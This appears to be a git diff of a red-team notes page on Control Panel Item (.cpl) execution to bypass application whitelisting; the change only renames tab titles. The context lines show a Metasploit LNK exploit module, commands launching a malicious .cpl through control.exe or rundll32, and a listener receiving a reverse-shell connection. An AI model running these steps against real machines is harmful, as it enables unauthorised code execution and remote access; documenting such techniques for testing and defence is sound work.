@@ -7,7 +7,7 @@ description: Control Panel Item code execution - bypass application whitelisting
 ## Execution
 
 {% code-tabs %}
-{% code-tabs-item title="attacker" %}
+{% code-tabs-item title="attacker@local" %}
 ```bash
 msfconsole
 use windows/local/cve_2017_8464_lnk_lpe
@@ -30,7 +30,7 @@ A quick look at the dissasemble of the dll suggests rundll32 will be spawned and
 ![](../.gitbook/assets/lnk-dissasm.png)
 
 {% code-tabs %}
-{% code-tabs-item title="victim" %}
+{% code-tabs-item title="attacker@victim" %}
 ```bash
 control.exe .\FlashPlayerCPLApp.cpl
 # or
@@ -42,7 +42,7 @@ rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl
 {% endcode-tabs %}
 
 {% code-tabs %}
-{% code-tabs-item title="attacker" %}
+{% code-tabs-item title="attacker@local" %}
 ```text
 10.0.0.2: inverse host lookup failed: Unknown host
 connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 49346
